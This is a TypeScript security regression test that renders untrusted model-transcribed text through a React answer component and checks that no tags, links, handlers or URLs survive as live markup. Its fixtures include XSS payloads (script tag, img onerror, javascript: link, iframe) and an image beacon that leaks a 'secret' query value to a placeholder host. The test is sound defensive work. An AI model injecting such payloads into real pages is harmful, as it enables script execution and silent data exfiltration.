/**
 * Security regression test for <Answer>. Run with `npm run check:inert`.
 *
 * The model transcribes whatever is on screen, so its output is untrusted input
 * rendered into our own webview. Two properties must hold, and both are one
 * careless line away from breaking:
 *
 *   - no raw HTML is ever executed (adding `rehype-raw` would break this)
 *   - nothing can issue a network request, which is how data leaves without
 *     any scripting at all: an `<img src>` alone is enough
 *
 * Rendering to static markup and asserting on the HTML is the point - eyeballing
 * a screenshot cannot tell an escaped `&lt;img&gt;` from a live one.
 *
 * Not part of the app bundle: nothing reachable from main.tsx imports it.
 */
import { renderToStaticMarkup } from "react-dom/server";
import { createElement } from "react";
import { Answer } from "./Answer";

const CASES = [
  "0. Inline code: `first_buffer` and **bold** text",
  "1. Script tag: <script>alert('xss')</script>",
  '2. Image handler: <img src=x onerror="alert(1)">',
  "3. Markdown image beacon: ![leak](https://example.com/beacon.png?d=secret)",
  "4. Markdown link: [click me](https://example.com/phish)",
  "5. Javascript URL: [go](javascript:alert(1))",
  '6. Raw iframe: <iframe src="https://example.com"></iframe>',
  "7. Entity smuggle: &lt;img src=x onerror=alert(1)&gt;",
  "8. Reference image: ![r][beacon]",
  "9. Autolink: <https://example.com/auto>",
  "10. Bare URL: visit https://example.com/bare now",
  "",
  "[beacon]: https://example.com/ref.png",
].join("\n");

const html = renderToStaticMarkup(createElement(Answer, { text: CASES }));

// Only what lands inside a real tag counts. Escaped prose such as
// `&lt;img src=x&gt;` contains the characters but is inert text, and a URL shown
// as visible words is fine — it makes no request and cannot be clicked.
const tags = html.match(/<[^>]+>/g) ?? [];
const inTags = tags.join(" ");

const checks: [string, boolean][] = [
  ["no <img> element", !/<img\b/i.test(inTags)],
  ["no <script> element", !/<script\b/i.test(inTags)],
  ["no <iframe> element", !/<iframe\b/i.test(inTags)],
  ["no <a> element", !/<a\b/i.test(inTags)],
  ["no href attribute", !/\shref\s*=/i.test(inTags)],
  ["no src attribute", !/\ssrc\s*=/i.test(inTags)],
  ["no on* handler attribute", !/\son[a-z]+\s*=/i.test(inTags)],
  // react-markdown hands every component its internal mdast `node`; spreading the
  // rest props straight onto a DOM element emits node="[object Object]", once per
  // inline code span - 299 times in a real answer.
  ["no framework internals leak as attributes", !inTags.includes(' node=')],
  ["no URL in any attribute", !/(https?:|javascript:)/i.test(inTags)],
  ["link text survives as words", /click me/.test(html)],
  ["entity-smuggled tag stays escaped", /&lt;img src=x/.test(html)],
  ["autolink URL is visible but inert", /<span class="link-text">https:\/\/example\.com\/auto<\/span>/.test(html)],
];

let bad = 0;
for (const [name, ok] of checks) {
  console.log((ok ? "  PASS  " : "  FAIL  ") + name);
  if (!ok) bad++;
}
console.log("\nelements emitted: " + [...new Set(tags.map((t) => (/^<\/?([a-z0-9]+)/i.exec(t) ?? [])[1]).filter(Boolean))].join(", "));
console.log("\n" + (bad === 0 ? "ALL CHECKS PASSED" : bad + " CHECK(S) FAILED"));
if (bad > 0) throw new Error(bad + " inert check(s) FAILED - see above");
